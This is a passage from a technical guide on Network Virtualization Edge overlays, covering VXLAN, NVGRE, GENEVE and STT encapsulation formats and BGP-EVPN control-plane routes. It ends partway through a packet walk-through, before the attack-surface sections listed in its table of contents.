# Network Virtualization Edge (NVE) — Complete In-Depth Guide

> **Scope:** Everything you need to build a complete mental model of NVE — architecture, protocols, encapsulations, control planes, implementations, attack surfaces, and security implications. Designed for deep technical understanding and adversarial thinking.

---

## Table of Contents

1. [Why NVE Exists — The Problem Space](#1-why-nve-exists--the-problem-space)
2. [Core Vocabulary and Mental Model](#2-core-vocabulary-and-mental-model)
3. [NVE Architecture Deep Dive](#3-nve-architecture-deep-dive)
4. [VXLAN — The Dominant NVE Protocol](#4-vxlan--the-dominant-nve-protocol)
5. [NVGRE — Network Virtualization using Generic Routing Encapsulation](#5-nvgre--network-virtualization-using-generic-routing-encapsulation)
6. [GENEVE — Generic Network Virtualization Encapsulation](#6-geneve--generic-network-virtualization-encapsulation)
7. [STT — Stateless Transport Tunneling](#7-stt--stateless-transport-tunneling)
8. [NVE Control Plane — BGP EVPN](#8-nve-control-plane--bgp-evpn)
9. [Data Plane Operations — Packet Walk-Through](#9-data-plane-operations--packet-walk-through)
10. [ARP Suppression and Proxy ARP](#10-arp-suppression-and-proxy-arp)
11. [BUM Traffic Handling](#11-bum-traffic-handling)
12. [Distributed Anycast Gateway](#12-distributed-anycast-gateway)
13. [Multi-Tenancy and VNI Design](#13-multi-tenancy-and-vni-design)
14. [NVE in Real Vendor Implementations](#14-nve-in-real-vendor-implementations)
15. [NVE in Cloud Platforms](#15-nve-in-cloud-platforms)
16. [NVE Security Architecture](#16-nve-security-architecture)
17. [Attack Surface and Exploitation Techniques](#17-attack-surface-and-exploitation-techniques)
18. [NVE Misconfigurations — Bug Bounty and Pentest](#18-nve-misconfigurations--bug-bounty-and-pentest)
19. [Packet Captures and Forensics](#19-packet-captures-and-forensics)
20. [Mental Model Summary](#20-mental-model-summary)

---

## 1. Why NVE Exists — The Problem Space

### 1.1 The Traditional VLAN Limit

Classical Ethernet networks use VLANs (IEEE 802.1Q) to segment Layer 2 domains. The problem:

- VLAN tag is 12 bits → maximum **4,094 usable VLANs**
- A modern hyperscale data center may need **millions of isolated tenant networks**
- 4,094 is nowhere near enough

### 1.2 The Spanning Tree Problem

Traditional Ethernet uses Spanning Tree Protocol (STP) to prevent loops. STP:

- Blocks redundant links → wastes bandwidth
- Converges slowly (seconds to minutes) → unacceptable in DCs
- Doesn't scale to tens of thousands of hosts

### 1.3 The MAC Table Explosion Problem

In a flat Layer 2 network with 100,000 virtual machines, every ToR (Top-of-Rack) switch must learn every MAC address. This is called **MAC table flooding and exhaustion**. Hardware TCAM on switches can hold ~100K–500K entries — not enough for hyper-scale, and not efficiently organized.

### 1.4 The VM Mobility Problem

Virtual machines can vMotion (live-migrate) between physical hosts across the data center while keeping their IP address. For this to work, the entire DC must be a single Layer 2 domain. A single L2 domain at that scale is an operational and security nightmare.

### 1.5 The Solution: Overlay Networks via NVE

The answer is to **decouple the tenant logical network (overlay) from the physical transport network (underlay)**:

```
┌──────────────────────────────────────────────────────┐
│  OVERLAY (Tenant View)                               │
│  VM-A ──────── virtual L2 switch ──────── VM-B       │
│  10.1.1.1                                10.1.1.2    │
└──────────────────────────────────────────────────────┘
         |                                    |
         ↓ encapsulate                        ↓ encapsulate
┌──────────────────────────────────────────────────────┐
│  UNDERLAY (Physical IP Network)                      │
│  Host-A ──── Router ──── Router ──── Host-B          │
│  192.168.1.1                         192.168.1.2     │
└──────────────────────────────────────────────────────┘
```

The **Network Virtualization Edge (NVE)** is the component that sits at the boundary between overlay and underlay. It performs:

1. **Encapsulation** — wrap tenant frames in an outer IP/UDP header
2. **Decapsulation** — unwrap received outer packets, deliver inner frame to tenant
3. **Learning/forwarding** — maintain the mapping of inner MAC/IP → outer VTEP IP
4. **Tunneling** — build and maintain tunnels between NVE peers

---

## 2. Core Vocabulary and Mental Model

### 2.1 Key Terms

| Term | Definition |
|------|-----------|
| **NVE** | Network Virtualization Edge — the logical encap/decap endpoint |
| **VTEP** | VXLAN Tunnel Endpoint — NVE term specific to VXLAN |
| **VNI** | Virtual Network Identifier — 24-bit tenant segment ID (VXLAN) |
| **VNI-L2** | A VNI mapped to a single broadcast domain (L2 segment) |
| **VNI-L3** | A VNI used for L3 routing across tenants (symmetric IRB) |
| **Overlay** | The virtual/logical network seen by the tenant |
| **Underlay** | The physical IP routed network carrying encapsulated frames |
| **EVPN** | Ethernet VPN — BGP address-family used as control plane for NVE |
| **IRB** | Integrated Routing and Bridging — L2+L3 forwarding at the NVE |
| **BUM** | Broadcast, Unknown-unicast, Multicast — traffic that must be flooded |
| **HER** | Head-End Replication — unicast flood mechanism for BUM traffic |
| **Route Distinguisher (RD)** | Makes EVPN routes unique per VRF/NVE |
| **Route Target (RT)** | Import/export policy for EVPN routes |
| **MAC-VRF** | Per-tenant MAC forwarding table at the NVE |
| **IP-VRF** | Per-tenant IP routing table at the NVE |
| **Anycast Gateway** | Same IP/MAC on all NVEs for distributed default-gateway |

### 2.2 The Stack Mental Model

Think of it in three planes:

```
┌─────────────────────────────────────┐
│  MANAGEMENT PLANE                   │
│  Configuration, SNMP, netconf       │
├─────────────────────────────────────┤
│  CONTROL PLANE                      │
│  BGP-EVPN: learns MAC/IP mappings   │
│  distributes them to all NVEs       │
├─────────────────────────────────────┤
│  DATA PLANE                         │
│  VXLAN/GENEVE/NVGRE: actual packet  │
│  encap/decap and forwarding         │
└─────────────────────────────────────┘
```

---

## 3. NVE Architecture Deep Dive

### 3.1 NVE Position in the Network

```
Physical Server (Hypervisor)
┌────────────────────────────────────────────────────────┐
│  ┌──────┐  ┌──────┐  ┌──────┐                         │
│  │ VM-A │  │ VM-B │  │ VM-C │  ← Tenant VMs           │
│  └──┬───┘  └──┬───┘  └──┬───┘                         │
│     │         │          │                             │
│  ┌──▼─────────▼──────────▼──────────────────────────┐  │
│  │           vSwitch / vBridge (e.g., OVS)           │  │
│  │   Performs L2 switching for the tenant segment    │  │
│  └───────────────────────┬───────────────────────────┘  │
│                          │                             │
│  ┌───────────────────────▼───────────────────────────┐  │
│  │        NVE / VTEP (software or hardware)          │  │
│  │  - Encapsulates tenant frames in VXLAN/GENEVE     │  │
│  │  - Decapsulates incoming tunnel packets           │  │
│  │  - Maintains inner-MAC → outer-VTEP-IP mapping   │  │
│  └───────────────────────┬───────────────────────────┘  │
│                          │                             │
│  ┌───────────────────────▼───────────────────────────┐  │
│  │       Physical NIC (underlay interface)           │  │
│  └───────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────┘
                           │
                           │  Underlay IP Network
                     ──────▼──────
                    / IP Routing  \
                    \ (OSPF/BGP)  /
                     ─────────────
                           │
           ┌───────────────┴───────────────┐
           │                               │
     ┌─────▼─────────────────────────────  ▼──────┐
     │  NVE/VTEP on ToR Switch           NVE/VTEP │
     │  (Hardware ASIC-based)            on Server │
     └────────────────────────────────────────────┘
```

### 3.2 NVE Implementation Types

#### Software NVE (Hypervisor-based)
- Runs inside the hypervisor (e.g., VMware ESXi, KVM with Open vSwitch)
- Each physical server running VMs is a VTEP
- Pro: very flexible, no hardware dependency
- Con: uses CPU cycles, lower performance vs hardware

#### Hardware NVE (ToR Switch ASIC)
- The Top-of-Rack switch is the VTEP
- ASICs handle encap/decap at line rate (e.g., Broadcom Trident, Tomahawk)
- Pro: wire-speed performance, centralized policy enforcement
- Con: less flexible than software NVE

#### Smart NIC / DPU-based NVE
- Offloads NVE processing to dedicated Network Processing Unit on the NIC
- Used by AWS (Nitro), Azure (Azure SmartNIC), Google (Titanium)
- Pro: zero CPU overhead, hardware performance, hardware-enforced isolation

### 3.3 NVE Tunnel Types

```
Point-to-Point Tunnel:
  NVE-A ←────────────────────────→ NVE-B
  (static, one tunnel per peer)

Point-to-Multipoint Tunnel (via HER):
  NVE-A ──→ NVE-B
         └→ NVE-C
         └→ NVE-D
  (NVE-A replicates BUM to all known VTEPs)

Point-to-Multipoint via Multicast:
  NVE-A ──→ Multicast Group ──→ NVE-B
                            └→ NVE-C
                            └→ NVE-D
```

---

## 4. VXLAN — The Dominant NVE Protocol

### 4.1 What VXLAN Is

VXLAN (Virtual Extensible LAN) is defined in **RFC 7348** (2014). It encapsulates Ethernet frames inside UDP/IP packets. The key innovation:

- Uses a **24-bit VNI** (Virtual Network Identifier) → 16,777,216 possible segments
- Uses **UDP** for transport → traverses NAT, works over any IP network
- Default UDP destination port: **4789** (IANA assigned; older implementations used 8472)

### 4.2 VXLAN Packet Format — Full ASCII Diagram

```
Outer Ethernet Frame:
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌─────────────────────────────────────────────────────────────────┐
│                   Outer Destination MAC (6 bytes)               │
├─────────────────────────────────────────────────────────────────┤
│                   Outer Source MAC      (6 bytes)               │
├──────────────────────────────┬──────────────────────────────────┤
│  Ethertype (0x0800=IPv4      │       ...                        │
│             0x86DD=IPv6)     │                                  │
└──────────────────────────────┴──────────────────────────────────┘

Outer IPv4 Header (20 bytes minimum):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌───────┬───────┬──────────────────────┬──────────────────────────┐
│  Ver  │  IHL  │    DSCP   │   ECN    │      Total Length        │
├───────┴───────┴──────────────────────┴──────────────────────────┤
│      Identification          │ Flags  │    Fragment Offset       │
├─────────────────────────────┬──────────────────────────────────┤
│          TTL                │  Proto=0x11 (UDP)                │
├─────────────────────────────┴──────────────────────────────────┤
│                    Header Checksum                              │
├────────────────────────────────────────────────────────────────┤
│                    Outer Source IP (VTEP-A IP)                  │
├────────────────────────────────────────────────────────────────┤
│                    Outer Destination IP (VTEP-B IP)             │
└────────────────────────────────────────────────────────────────┘

Outer UDP Header (8 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌────────────────────────────┬──────────────────────────────────┐
│   Source Port (entropy)    │  Destination Port = 4789         │
├────────────────────────────┴──────────────────────────────────┤
│        UDP Length          │         UDP Checksum             │
└──────────────────────────────────────────────────────────────┘

VXLAN Header (8 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌─┬──────────────────────────────────────────────────────────────┐
│I│  Reserved (7 bits)   │       Reserved (24 bits)             │
├─┴──────────────────────────────────────────────────────────────┤
│          VNI (24 bits)                    │ Reserved (8 bits)  │
└────────────────────────────────────────────────────────────────┘

  I flag = 1 means VNI is valid (MUST be set)
  VNI: 24-bit tenant segment identifier (0–16,777,215)

Inner Ethernet Frame (original tenant frame):
┌────────────────────────────────────────────────────────────────┐
│                   Inner Destination MAC                        │
├────────────────────────────────────────────────────────────────┤
│                   Inner Source MAC                             │
├────────────────────────────────────────────────────────────────┤
│    Ethertype / 802.1Q tag (if VLAN-tagged)                     │
├────────────────────────────────────────────────────────────────┤
│              Inner IP Header + Payload                         │
└────────────────────────────────────────────────────────────────┘
```

### 4.3 VXLAN Overhead Calculation

```
Original IP packet:    N bytes
Inner Ethernet header: 14 bytes (or 18 with 802.1Q)
VXLAN header:           8 bytes
Outer UDP header:        8 bytes
Outer IP header:        20 bytes (IPv4) or 40 bytes (IPv6)
Outer Ethernet header:  14 bytes
─────────────────────────────────────────────────────
Total overhead:         64 bytes (IPv4) or 84 bytes (IPv6)

Standard MTU = 1500 bytes
VXLAN inner payload max = 1500 - 64 = 1436 bytes (IPv4 underlay)

→ Underlay MTU MUST be set to 1600+ (usually 9000 with jumbo frames)
  to avoid fragmentation
```

### 4.4 The Source Port Entropy Trick

VXLAN uses a **variable source UDP port** (typically in the range 49152–65535) derived from hashing inner frame fields (inner src/dst IP, inner src/dst port, protocol). Why?

Because ECMP (Equal-Cost Multi-Path) load balancing in routers uses a 5-tuple hash. If the source port were fixed, all VXLAN traffic between two VTEPs would follow the same path. By varying the source port based on inner flow, different tenant flows get load-balanced across different underlay paths.

```
Inner flow (5-tuple) ──────hash──────→ Outer UDP Source Port
                                        (different per inner flow)
                                               │
                                               ▼
                               ECMP load balances on outer 5-tuple
                               → different flows → different links
```

### 4.5 VXLAN Learning Modes

#### Data Plane Learning (RFC 7348 Original)
- VTEP learns inner MAC → outer VTEP IP mapping from incoming packets
- Similar to how Ethernet switches learn MACs
- BUM traffic floods to all VTEPs in the segment
- Problem: doesn't scale, lots of unnecessary flood traffic

#### Control Plane Learning (BGP-EVPN — the modern way)
- BGP distributes MAC/IP bindings across all VTEPs
- No flooding for known unicast
- See Section 8 for full BGP-EVPN details

---

## 5. NVGRE — Network Virtualization using Generic Routing Encapsulation

### 5.1 Background

NVGRE is defined in **RFC 7637** (2015). It was championed by Microsoft and is used in older Hyper-V deployments. Unlike VXLAN (UDP), it uses GRE (IP Protocol 47).

**Key difference from VXLAN:** NVGRE uses GRE, which means it does **not** have a UDP port number. This makes ECMP load balancing harder because most routers only ECMP on 5-tuple (src IP, dst IP, proto, src port, dst port). GRE has no ports, so it falls back to 3-tuple (src IP, dst IP, proto), resulting in poor load distribution.

### 5.2 NVGRE Packet Format

```
Outer Ethernet Header (14 bytes)
┌────────────────────────────────────────────────────────────────┐
│  Outer Dst MAC  │  Outer Src MAC  │  Ethertype=0x0800          │
└────────────────────────────────────────────────────────────────┘

Outer IP Header (20 bytes)
┌────────────────────────────────────────────────────────────────┐
│  Ver=4 │ IHL=5 │ DSCP │ ECN │ Total Length                    │
├────────────────────────────────────────────────────────────────┤
│  ID    │ Flags │ Frag Offset │ TTL │ Protocol=0x2F (GRE=47)   │
├────────────────────────────────────────────────────────────────┤
│  Header Checksum                                               │
├────────────────────────────────────────────────────────────────┤
│  Outer Source IP (NVE-A endpoint IP)                           │
├────────────────────────────────────────────────────────────────┤
│  Outer Destination IP (NVE-B endpoint IP)                      │
└────────────────────────────────────────────────────────────────┘

GRE + NVGRE Header (8 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌─┬─┬───────────────┬────────────────────────────────────────────┐
│C│0│  Reserved(10) │  Protocol Type = 0x6558 (Transparent ETH)  │
├─┴─┴───────────────┴────────────────────────────────────────────┤
│          VSID (Virtual Subnet ID, 24 bits)      │ FlowID(8b)   │
└────────────────────────────────────────────────────────────────┘
  C = Checksum Present (usually 0)
  VSID = 24-bit tenant identifier (equivalent to VXLAN VNI)
  FlowID = 8-bit flow entropy hint (router may use for ECMP)

Inner Ethernet Frame:
┌────────────────────────────────────────────────────────────────┐
│  Inner Dst MAC  │  Inner Src MAC  │ Ethertype │ Payload...     │
└────────────────────────────────────────────────────────────────┘
```

### 5.3 NVGRE vs VXLAN Comparison

| Property | VXLAN | NVGRE |
|----------|-------|-------|
| Transport | UDP (IP proto 17) | GRE (IP proto 47) |
| Tenant ID | VNI (24-bit) | VSID (24-bit) |
| ECMP Support | Excellent (UDP src port entropy) | Poor (GRE = no ports) |
| Default Port | UDP/4789 | N/A (IP proto 47) |
| Fragmentation | Can fragment at IP layer | Same |
| Hardware support | Wide (Broadcom, Intel, etc.) | Narrower (mainly Hyper-V) |
| RFC | RFC 7348 | RFC 7637 |
| Industry adoption | Dominant | Declining |

---

## 6. GENEVE — Generic Network Virtualization Encapsulation

### 6.1 Background and Why GENEVE

GENEVE (Generic Network Virtualization Encapsulation) is defined in **RFC 8926** (2020). It was designed by a consortium of VMware, Microsoft, Intel, and Red Hat to be the **extensible, future-proof** overlay protocol. The key design goal: be flexible enough to replace VXLAN, NVGRE, and STT with a single protocol by supporting optional TLV (Type-Length-Value) metadata.

**Used by:** Open vSwitch (OVS), AWS Nitro (natively), VMware NSX-T (alongside Geneve), Kubernetes (Flannel, Calico can use it).

### 6.2 GENEVE Packet Format

```
Outer Ethernet Header (14 bytes)
┌────────────────────────────────────────────────────────────────┐
│  Outer Dst MAC  │  Outer Src MAC  │  Ethertype                 │
└────────────────────────────────────────────────────────────────┘

Outer IP Header (20 bytes IPv4 or 40 bytes IPv6)
┌────────────────────────────────────────────────────────────────┐
│  Standard IP header, Proto=UDP (0x11)                          │
│  Src = Local VTEP IP, Dst = Remote VTEP IP                     │
└────────────────────────────────────────────────────────────────┘

Outer UDP Header (8 bytes):
┌────────────────────────────┬──────────────────────────────────┐
│   Source Port (entropy)    │  Destination Port = 6081         │
├────────────────────────────┴──────────────────────────────────┤
│         UDP Length          │        UDP Checksum              │
└──────────────────────────────────────────────────────────────┘
  NOTE: GENEVE uses UDP port 6081 (IANA assigned)

GENEVE Fixed Header (8 bytes):
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌───────┬─┬─┬──────────────────┬──────────────────────────────────┐
│Ver(2) │O│C│  Rsvd(6 bits)   │  Protocol Type (16 bits)          │
├───────┴─┴─┴──────────────────┴──────────────────────────────────┤
│    Virtual Network Identifier (VNI, 24 bits)    │  Reserved(8)  │
└──────────────────────────────────────────────────────────────────┘
  Ver = 0 (current version)
  O   = Control packet (OAM flag)
  C   = Critical TLV options present
  Opt Len = Length of variable options in 4-byte words (6 bits)
  Protocol Type = inner payload type (0x6558 = Ethernet, 0x0800 = IPv4)
  VNI = 24-bit Virtual Network Identifier (same concept as VXLAN VNI)

GENEVE Variable Options (0 to 252 bytes in 4-byte multiples):
Each option is a TLV:
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌──────────────────────────────┬──────────────┬─┬─────────────────┐
│    Option Class (16 bits)    │  Type(8 bits)│R│  Length(5 bits) │
├──────────────────────────────┴──────────────┴─┴─────────────────┤
│                    Option Data (variable)                        │
└─────────────────────────────────────────────────────────────────┘
  Option Class: namespace (e.g., 0x0106 = Linux, 0x0110 = VMware)
  Type: class-specific option type
  R: Critical bit (if 1, receiver must understand or drop packet)
  Length: data length in 4-byte words (0 = no data, just the 4-byte header)

Inner Ethernet Frame (or inner IP if Protocol Type = 0x0800):
┌────────────────────────────────────────────────────────────────┐
│  Inner Dst MAC  │  Inner Src MAC  │ Type/VLAN │ Payload...     │
└────────────────────────────────────────────────────────────────┘
```

### 6.3 GENEVE TLV Options — The Key Differentiator

GENEVE can carry metadata inline with the packet. Examples of what TLV options can carry:

- **Security group IDs** — carry tenant policy tags that NVEs use for micro-segmentation
- **Entropy/flow labels** — for ECMP without inner packet inspection
- **OAM data** — timestamps, latency measurements
- **NSH (Network Service Header) pointers** — for service function chaining
- **AWS VPC flow metadata** — AWS uses custom GENEVE TLVs in the Nitro hypervisor

### 6.4 GENEVE vs VXLAN vs NVGRE Summary

| Feature | VXLAN | NVGRE | GENEVE |
|---------|-------|-------|--------|
| RFC | 7348 | 7637 | 8926 |
| Transport | UDP | GRE | UDP |
| Default Port | 4789 | N/A | 6081 |
| Extensibility | None | None | TLV options |
| Tenant ID bits | 24 | 24 | 24 |
| Inner protocol | ETH only | ETH only | Any (via type field) |
| Metadata support | No | No | Yes (TLV) |
| Maturity | Production | Declining | Growing |
| Used by | Most vendors | Microsoft | AWS, OVS, NSX-T |

---

## 7. STT — Stateless Transport Tunneling

### 7.1 Background

STT is defined in an IETF draft (never became an RFC). Designed by Nicira (later acquired by VMware), it's used internally by some VMware NSX deployments. The problem it solved: in 2010-era hardware, TSO (TCP Segmentation Offload) was hardware-accelerated but UDP was not. STT uses a **fake TCP header** to trick NICs into using hardware TSO offload for large overlay frames.

### 7.2 STT Concept

```
STT uses TCP-like framing but NOT TCP semantics:
- No connection state (stateless despite looking like TCP)
- No retransmission, no flow control
- Just borrows the TCP header format to activate NIC TSO offload

STT Packet:
 ┌─────────────────────────────────────────────────┐
 │  Outer Ethernet Header                          │
 ├─────────────────────────────────────────────────┤
 │  Outer IP Header (Proto=TCP/0x06)               │
 ├─────────────────────────────────────────────────┤
 │  Fake TCP Header (20 bytes)                     │
 │  Dst Port = 7471 (STT port)                     │
 ├─────────────────────────────────────────────────┤
 │  STT Frame Header (18 bytes)                    │
 │  - Flags, MTU, VNI/Context ID (64 bits!)        │
 ├─────────────────────────────────────────────────┤
 │  Inner Ethernet Frame                           │
 └─────────────────────────────────────────────────┘
```

### 7.3 STT Context ID

STT uses a 64-bit Context ID (vs 24-bit VNI in VXLAN). This was designed to carry richer metadata, but never gained mainstream adoption because hardware TSO offload for UDP became ubiquitous, eliminating STT's performance advantage.

---

## 8. NVE Control Plane — BGP EVPN

### 8.1 Why a Control Plane Is Needed

In data-plane-only learning (original VXLAN RFC 7348), when VM-A sends ARP for VM-B:

1. NVE-A doesn't know which VTEP hosts VM-B
2. NVE-A floods the ARP to **all** VTEPs in the VNI
3. All VTEPs process it
4. Only one VTEP has VM-B, which responds

This flood-and-learn model doesn't scale. BGP-EVPN solves it by distributing MAC/IP learning via a control protocol before data packets are sent.

### 8.2 What is BGP-EVPN

BGP-EVPN is defined in **RFC 7432** (for MPLS/EVPN) extended by **RFC 8365** (for NVO/VXLAN use).

EVPN is a BGP **address family** (AFI=25, SAFI=70). It allows BGP to advertise:

- **Ethernet MAC addresses** (with optional IP binding)
- **IP prefixes** (for inter-VNI routing)
- **VTEP reachability**
- **Multicast group membership**

### 8.3 EVPN Route Types

There are 5 primary EVPN route types:

```
Route Type 1: Ethernet Auto-Discovery (A-D) Route
  Used for: Fast convergence in multihoming, split-horizon
  NLRI: RD + ESI (Ethernet Segment ID) + EtherTag + MPLS/VNI Label
  Purpose: Announces that a CE is multihomed, enables aliasing

Route Type 2: MAC/IP Advertisement Route  ← MOST IMPORTANT
  Used for: Advertising learned MAC addresses (and optionally their IP)
  NLRI: RD + EtherTag + MAC Length + MAC Address + IP Length + IP Addr
  Carries: VTEP IP (Next-hop), VNI (in MPLS label field)
  Purpose: Remote VTEPs build their MAC-IP table from these

Route Type 3: Inclusive Multicast Ethernet Tag (IMET) Route
  Used for: BUM traffic handling — announces "I am a VTEP in VNI X"
  NLRI: RD + EtherTag + IP address
  Purpose: Used to build the HER (Head-End Replication) list

Route Type 4: Ethernet Segment Route
  Used for: Multihoming — DF (Designated Forwarder) election
  NLRI: RD + ESI + IP address
  Purpose: Ensures only one NVE forwards BUM to a multi-homed CE

Route Type 5: IP Prefix Route  ← CRITICAL FOR L3 ROUTING
  Used for: Advertising IP subnets/prefixes across VNIs
  NLRI: RD + EtherTag + IP Prefix Length + IP Prefix + GW IP
  Purpose: Enables inter-VNI routing without needing a full MAC
```

### 8.4 BGP-EVPN Message Flow — Type 2 Route Example

```
                BGP Route Reflector (RR)
                        │
            ┌───────────┴───────────┐
            │                       │
         NVE-A                    NVE-B
    (hosts VM-A: 10.1.1.1)  (hosts VM-B: 10.1.1.2)
    (VTEP IP: 1.1.1.1)       (VTEP IP: 2.2.2.2)

Step 1: VM-A comes up. NVE-A learns MAC=AA:BB:CC:DD:EE:01, IP=10.1.1.1

Step 2: NVE-A generates EVPN Type-2 Route:
  BGP UPDATE:
    Path Attr: MP_REACH_NLRI
      AFI=25 (L2VPN), SAFI=70 (EVPN)
      Next-Hop = 1.1.1.1 (NVE-A VTEP IP)
    NLRI:
      Route Type = 2
      RD = 1.1.1.1:100
      EtherTag = 0
      MAC = AA:BB:CC:DD:EE:01  (6 bytes)
      IP  = 10.1.1.1           (4 bytes)
      Label1 = VNI 10100 (L2 VNI for this segment)
      Label2 = VNI 10001 (L3 VNI for routing, if symmetric IRB)
    Extended Community:
      Route-Target: 65000:10100  ← import/export policy
      Encapsulation: VXLAN

Step 3: RR reflects the UPDATE to NVE-B

Step 4: NVE-B imports route (RT matches its VNI config)
  NVE-B now knows:
    Inner MAC AA:BB:CC:DD:EE:01 → Outer VTEP 1.1.1.1
    Inner IP  10.1.1.1           → Outer VTEP 1.1.1.1
  No flooding needed for unicast to VM-A!

Step 5: When VM-B sends to VM-A:
  NVE-B looks up 10.1.1.1 → found via EVPN → VTEP=1.1.1.1
  NVE-B encapsulates and sends directly to NVE-A
  NVE-A decapsulates → delivers to VM-A
```

### 8.5 BGP-EVPN Wire Format (UPDATE Message)

```
BGP UPDATE Message:
┌─────────────────────────────────────────────────────────────────┐
│  BGP Header (19 bytes)                                          │
│  Marker=16×0xFF │ Length │ Type=2 (UPDATE)                      │
├─────────────────────────────────────────────────────────────────┤
│  Withdrawn Routes Length = 0 (typically)                        │
├─────────────────────────────────────────────────────────────────┤
│  Total Path Attributes Length                                   │
├─────────────────────────────────────────────────────────────────┤
│  Path Attributes:                                               │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  ORIGIN (Type=1): IGP                                   │    │
│  ├─────────────────────────────────────────────────────────┤    │
│  │  AS_PATH (Type=2): [65000]                              │    │
│  ├─────────────────────────────────────────────────────────┤    │
│  │  MP_REACH_NLRI (Type=14):                               │    │
│  │    AFI = 25 (L2VPN)                                     │    │
│  │    SAFI = 70 (EVPN)                                     │    │
│  │    Next-Hop Length = 4                                  │    │
│  │    Next-Hop = 1.1.1.1 (VTEP IP)                        │    │
│  │    NLRI:                                                │    │
│  │      Route Type = 2                                     │    │
│  │      Length = <variable>                                │    │
│  │      RD = 1.1.1.1:100 (8 bytes)                        │    │
│  │      ESI = 00:00:00:00:00:00:00:00:00:00 (10 bytes)    │    │
│  │      Ethernet Tag ID = 0 (4 bytes)                      │    │
│  │      MAC Addr Length = 48 (1 byte)                      │    │
│  │      MAC Address = AA:BB:CC:DD:EE:01 (6 bytes)          │    │
│  │      IP Addr Length = 32 (1 byte)                       │    │
│  │      IP Address = 10.1.1.1 (4 bytes)                    │    │
│  │      MPLS Label1 = VNI 10100 (3 bytes, encoded)         │    │
│  │      MPLS Label2 = VNI 10001 (3 bytes, if L3 VNI)       │    │
│  ├─────────────────────────────────────────────────────────┤    │
│  │  EXTENDED_COMMUNITIES (Type=16):                        │    │
│  │    RT (0x0002): 65000:10100                             │    │
│  │    Encapsulation (0x0030): VXLAN (0x0008)               │    │
│  │    Router's MAC (0x0006): 00:50:56:xx:xx:xx            │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

### 8.6 Route Distinguisher and Route Target

**Route Distinguisher (RD):** Makes EVPN routes globally unique in the BGP table. Two NVEs can both have a host at 10.1.1.1 in different VNIs — the RD makes these routes distinguishable in BGP.

Format: `<IP>:<number>` or `<ASN>:<number>` — always 8 bytes.

```
RD Format Type 1: IP:number
  e.g., 192.168.1.1:100

RD Format Type 2: AS:number
  e.g., 65000:100
```

**Route Target (RT):** Controls **which VRF/VNI imports which routes**. Think of it as a tag that says "I belong to tenant X."

```
RT Export: When NVE-A advertises a MAC/IP, it tags the BGP route with RT
RT Import: NVE-B imports routes whose RT matches its configured import RT

Example:
  NVE-A config: VNI 10100 → RT export 65000:10100
  NVE-B config: VNI 10100 → RT import 65000:10100
  → NVE-B imports all routes from VNI 10100 segment
```

### 8.7 BGP-EVPN Topology Variants

#### IBGP with Route Reflector (most common)
```
        ┌──────────────────────────────────┐
        │      BGP Route Reflectors        │
        │     RR-1 ←────→ RR-2            │
        └──────────┬──────────────┬────────┘
                   │              │
         ┌─────────┼──────────────┼─────────┐
         │         │              │         │
      NVE-1      NVE-2         NVE-3      NVE-4
   (Leaf/ToR)  (Leaf/ToR)  (Leaf/ToR)  (Leaf/ToR)

All NVEs are iBGP clients of both RRs
RRs reflect all EVPN routes between leaves
Typically RRs are the Spine switches or dedicated VMs
```

#### EBGP Spine-Leaf (modern approach)
```
        ┌──────────────────────────────────┐
        │         Spine Switches           │
        │     Spine-1 ←────→ Spine-2      │
        │    ASN 65100    ASN 65100        │
        └──────────┬──────────────┬────────┘
         eBGP      │              │  eBGP
         ┌─────────┼──────────────┼─────────┐
         │         │              │         │
      NVE-1      NVE-2         NVE-3      NVE-4
    ASN 65001  ASN 65002     ASN 65003  ASN 65004

Each Leaf has unique ASN
Spines are route servers (no route aggregation)
Widely used in Clos/fat-tree data centers
```

---

## 9. Data Plane Operations — Packet Walk-Through

### 9.1 Full Packet Walk: VM-A to VM-B (Same VNI, Different Hosts)

```
TOPOLOGY:
  VM-A: MAC=AA:AA, IP=10.1.1.1, on Host-1 (VTEP=1.1.1.1), VNI=10100
  VM-B: MAC=BB:BB, IP=10.1.1.2, on Host-2 (VTEP=2.2.2.2), VNI=10100
  NVE-A already knows VM-B's location via BGP-EVPN

STEP 1: VM-A wants to send to VM-B
  VM-A has IP 10.1.1.2 in ARP cache → MAC=BB:BB
  VM-A sends: [Src=AA:AA, Dst=BB:BB, SrcIP=10.1.1.1, DstIP=10.1.1.2]

STEP 2: Frame arrives at NVE-A (vSwitch/VTEP on Host-1)
  NVE-A looks up inner MAC BB:BB in its FDB (Forwarding DB)
  → Found: BB:BB is reachable via VTEP 2.2.2.2, VNI 10100
  NVE-A decides to VXLAN-encapsulate and forward

STEP 3: NVE-A builds VXLAN packet:
  ┌──────────────────────────────────────────────────────────┐
  │ Outer ETH: Src=Host1-MAC, Dst=Nexthop-MAC (underlay GW) │
  ├──────────────────────────────────────────────────────────┤
  │ Outer IP:  Src=1.1.1.1, Dst=2.2.2.2, TTL=64, Proto=UDP  │
  ├──────────────────────────────────────────────────────────┤
  │ Outer UDP: Src=<entropy>, Dst=4789                       │
  ├──────────────────────────────────────────────────────────┤
  │ VXLAN Hdr: Flags=0x08 (I=1), VNI=10100                  │
  ├──────────────────────────────────────────────────────────┤
  │ Inner ETH: Src=AA:AA, Dst=BB:BB                          │
  ├──────────────────────────────────────────────────────────┤
  │ Inner IP:  Src=10.1.1.1, Dst=10.1.1.2                   │
  ├──────────────────────────────────────────────────────────┤
